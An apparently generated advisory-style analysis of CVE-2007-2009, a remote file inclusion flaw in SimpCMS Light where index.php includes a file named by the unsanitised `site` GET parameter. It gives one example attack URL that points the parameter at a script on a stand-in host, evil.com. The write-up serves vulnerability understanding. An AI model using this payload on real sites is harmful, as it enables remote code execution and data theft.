Based on the provided content, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2007-2009

**Root Cause of Vulnerability:**
- The vulnerability lies in the `index.php` file of SimpCMS Light.
- The `index.php` file includes another PHP file based on user-controlled input from the `site` parameter via a GET request.
- Specifically, the code uses `include $site.".php";` where `$site` comes directly from the `$_GET[site]` parameter.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The primary weakness is the ability to include a remote file by manipulating the `site` parameter. Since no input validation or sanitization is performed on the `site` parameter, an attacker can specify a URL pointing to a malicious PHP script, which will then be executed by the server.
- **Lack of Input Validation:** The code does not validate or sanitize the `site` parameter, allowing arbitrary values to be used in the include statement.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By including a malicious script, an attacker can execute arbitrary code on the server, leading to a full compromise of the system.
- **Data Theft and Modification:** An attacker could potentially steal sensitive data, modify files, or deface the website.
- **Malware Distribution:** The attacker could use the compromised system to distribute malware to visitors.

**Attack Vectors:**
- **HTTP GET Request:** The attack vector is via an HTTP GET request to `index.php`, where the attacker includes a `site` parameter with a URL to a malicious PHP file.
    - Example: `http://site.com/[path]/index.php?site=http://evil.com/evilscript`

**Required Attacker Capabilities/Position:**
- The attacker needs the ability to send HTTP requests to the server hosting the vulnerable SimpCMS Light application.
- The attacker must know the path to the `index.php` file.
- The attacker must have access to a server where they can host a malicious PHP script.

**Additional Details:**
- The vulnerability does not require `register_globals` to be enabled, as the `$site` variable is populated directly from `$_GET`.
- The exploit is detailed on Exploit-DB with the EDB-ID 3705.
- The vulnerable code snippet is `include $site.".php";` located in line 31 of index.php
